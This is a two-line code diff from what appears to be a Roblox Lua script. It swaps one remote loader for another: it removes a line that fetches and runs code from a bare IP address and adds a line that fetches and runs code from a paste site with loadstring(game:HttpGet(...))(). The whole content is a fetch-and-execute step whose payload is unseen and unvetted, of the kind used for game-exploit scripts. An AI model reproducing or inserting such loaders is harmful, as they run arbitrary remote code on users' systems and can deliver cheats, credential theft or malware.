@@ -1,2 +1,1 @@
-ID="4d80bc89-a4cd-435e-b511-97b3fb0d4ad7";
-loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/JPd3Pehs/raw"))()
